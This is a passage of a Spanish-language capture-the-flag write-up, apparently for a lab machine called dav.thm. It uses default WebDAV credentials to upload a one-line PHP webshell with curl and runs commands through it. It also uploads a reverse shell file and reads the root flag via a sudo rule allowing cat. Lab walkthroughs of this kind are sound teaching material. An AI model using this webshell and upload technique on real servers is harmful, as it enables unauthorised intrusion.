### Webshell

Usando las mismas subi una webshell ya que no habia mucha informacion en dicho servicio, para eso use `cURL`.

```bash
curl -X PUT --user "wampp:xampp" http://dav.thm/webdav/shell.php -d '<?php system($_GET["cmd"]); ?>'
```

Y verifico la ejecucion de comandos.

```bash
curl "http://wampp:xampp@dav.thm/webdav/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Shell

O por otro lado puedo subir una reverse shell en `php` .

```bash
curl "http://wampp:xampp@dav.thm/webdav/" --upload-file zsln.php
```

Enviar una solicitud a la misma.

```bash
curl "http://wampp:xampp@dav.thm/webdav/zsln.php"
```

## Shell as root
### cat SUID Binary

Viendo los privilegios del usuario `www-data` veo que puede usar cat como el usuario `root`.
Dandome la capacidad de ver la flag de dicho usuario.

```bash
www-data@ubuntu:/home/merlin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$ sudo /bin/cat /root/root.txt
```
